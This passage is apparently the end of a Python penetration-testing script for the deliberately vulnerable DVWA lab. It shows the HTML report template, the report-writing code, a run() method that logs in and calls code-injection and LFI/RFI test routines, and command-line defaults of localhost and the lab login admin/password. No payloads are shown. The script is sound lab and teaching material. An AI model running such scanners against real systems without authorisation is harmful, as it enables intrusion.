            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_Remote_File_Inclusion">OWASP Testing Guide - OTG-INPVAL-034</a></li>
            <li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Code Injection</a></li>
            <li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Path Traversal</a></li>
            <li><a href="https://cwe.mitre.org/data/definitions/98.html">CWE-98: RFI</a></li>
            <li><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA) Documentation</a></li>
        </ul>
    </div>

    <div class="footer">
        <p>Generated by DVWA Code Injection, LFI & RFI Testing Script | OWASP/OSCP-Style Report</p>
        <p>Report generated on: {timestamp}</p>
    </div>

    <script>
        function openTab(evt, tabName) {{
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {{
                tabcontent[i].style.display = "none";
            }}
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {{
                tablinks[i].className = tablinks[i].className.replace(" active", "");
            }}
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }}
    </script>
</body>
</html>"""
        
        # Write report to file
        try:
            os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"[+] HTML report saved to: {self.output_file}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def run(self):
        """Main execution method"""
        print("=== DVWA Code Injection, LFI & RFI Testing Script ===")
        print(f"Target: {self.base_url}")
        print(f"Output: {self.output_file}")
        print(f"Delay between requests: {self.delay}s")
        print()
        
        # Login to DVWA
        if not self.login():
            print("[-] Failed to login. Exiting.")
            return False
        
        # Discover endpoints
        self.discover_endpoints()
        
        if not self.endpoints:
            print("[-] No endpoints discovered. Exiting.")
            return False
        
        # Test Code Injection
        self.test_code_injection()
        
        # Test LFI/RFI
        self.test_lfi_rfi()
        
        # Generate report
        self.generate_html_report()
        
        # Summary
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        code_injection_vuln = sum(1 for r in self.results if r.get('vuln_type') == 'Code Injection' and r.get('vulnerable', False))
        lfi_vuln = sum(1 for r in self.results if r.get('vuln_type') == 'LFI' and r.get('vulnerable', False))
        rfi_vuln = sum(1 for r in self.results if r.get('vuln_type') == 'RFI' and r.get('vulnerable', False))
        
        total_tests = len(self.results)
        print(f"\n=== Test Summary ===")
        print(f"Total endpoints tested: {len(self.endpoints)}")
        print(f"Total tests conducted: {total_tests}")
        print(f"Code Injection vulnerabilities: {code_injection_vuln}")
        print(f"LFI vulnerabilities: {lfi_vuln}")
        print(f"RFI vulnerabilities: {rfi_vuln}")
        print(f"Total vulnerabilities: {vulnerable_count}")
        print(f"Security status: {'VULNERABLE' if vulnerable_count > 0 else 'SECURE'}")
        
        return True

def main():
    parser = argparse.ArgumentParser(description='DVWA Code Injection, LFI & RFI Testing Script (OTG-INPVAL-012, 033, 034)')
    parser.add_argument('--url', default='http://localhost/dvwa', help='DVWA base URL (default: http://localhost/dvwa)')
    parser.add_argument('--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('--output', default='reports/code_injection_lfi_rfi_report.html', help='Output HTML report file (default: reports/code_injection_lfi_rfi_report.html)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests in seconds (default: 1.0)')
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = DVWACodeInjectionLFI_RFITester(args.url, args.username, args.password, args.output, args.timeout, args.delay)
    
    # Run tests
    success = tester.run()
    
    if success:
        print(f"\n[+] Testing completed successfully!")
        print(f"[+] Check report: {args.output}")
    else:
        print(f"\n[-] Testing failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()